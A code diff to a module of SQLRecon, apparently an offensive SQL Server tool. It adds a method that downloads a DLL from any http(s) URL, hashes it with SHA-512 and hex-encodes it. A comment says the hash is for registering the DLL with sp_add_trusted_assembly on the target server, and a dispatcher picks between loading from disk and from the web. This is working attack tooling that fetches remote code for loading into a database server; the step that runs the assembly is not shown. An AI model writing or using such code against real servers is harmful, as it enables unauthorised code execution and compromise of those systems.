@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Data.SqlClient;
 using System.IO;
+using System.Net;
 using System.Security.Cryptography;
 
 namespace SQLRecon.Modules
@@ -10,7 +11,7 @@ namespace SQLRecon.Modules
         SQLQuery sqlQuery = new SQLQuery();
         Configure config = new Configure();
 
-        public string[] ConvertDLLToSQLBytes(String dll)
+        public string[] ConvertDLLToSQLBytesFile(String dll)
         {
             string[] dllArr = new string[2];
             string dllHash = "";
@@ -43,10 +44,79 @@ namespace SQLRecon.Modules
             }
             catch (FileNotFoundException)
             {
-                Console.WriteLine("[!] ERROR: Unable to load " + dll);
+                Console.WriteLine("[!] ERROR: Unable to load: " + dll);
             }
+
             dllArr[0] = dllHash;
             dllArr[1] = dllBytes;
+            return dllArr;
+        }
+
+        public string[] ConvertDLLToSQLBytesWeb(String dll)
+        {
+            string[] dllArr = new string[2];
+            string dllHash = "";
+            string dllBytes = "";
+
+            try
+            {
+                // get the SHA-512 hash of the DLL so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server
+                using (SHA512 SHA512 = SHA512Managed.Create())
+                {
+                    using (var client = new WebClient())
+                    {
+                        System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
+                        Console.WriteLine("\n[+] Downloading DLL from: " + dll);
+
+                        var content = client.DownloadData(dll);
+
+                        using (var stream = new MemoryStream(content))
+                        {
+                            BinaryReader reader = new BinaryReader(stream);
+                            byte[] dllByteArray = reader.ReadBytes(Convert.ToInt32(stream.Length));
+                            stream.Close();
+                            reader.Close();
+
+                            Console.WriteLine("\n[+] DLL is " + dllByteArray.Length + " bytes, this will take a minute ...");
+
+                            foreach (var hash in SHA512.ComputeHash(dllByteArray))
+                            {
+                                dllHash += hash.ToString("x2");
+                            }
+                            // read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server
+                            foreach (Byte b in dllByteArray)
+                            {
+                                dllBytes += b.ToString("X2");
+                            }
+                        }
+                    }
+                   
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] ERROR: Unable to download DLL");
+            }
+
+            dllArr[0] = dllHash;
+            dllArr[1] = dllBytes;
+            return dllArr;
+        }
+
+        public string[] ConvertDLLToSQLBytes(String dll)
+        {
+            string[] dllArr = new string[2];
+
+            // logic to determine if the DLL is being read from disk or web
+            if (dll.ToLower().Contains("http://") || dll.ToLower().Contains("https://"))
+            {
+                dllArr = ConvertDLLToSQLBytesWeb(dll);
+            }
+            else
+            {
+                dllArr = ConvertDLLToSQLBytesFile(dll);
+            }
+
             return dllArr;
         }
 
@@ -68,9 +138,10 @@ namespace SQLRecon.Modules
             string dllHash = dllArr[0];
             string dllBytes = dllArr[1];
 
+          
             if (dllHash.Length != 128)
             {
-                Console.WriteLine("[!] ERROR: Unable to load " + dll);
+                Console.WriteLine("[!] ERROR: Unable to calculate hash for DLL");
                 return;
             }
 
@@ -157,7 +228,7 @@ namespace SQLRecon.Modules
 
             if (dllHash.Length != 128)
             {
-                Console.WriteLine("[!] ERROR: Unable to load " + dll);
+                Console.WriteLine("[!] ERROR: Unable to calculate hash for DLL");
                 return;
             }
 
@@ -245,7 +316,7 @@ namespace SQLRecon.Modules
 
             if (dllHash.Length != 128)
             {
-                Console.WriteLine("[!] ERROR: Unable to load " + dll);
+                Console.WriteLine("[!] ERROR: Unable to calculate hash for DLL");
                 return;
             }
 
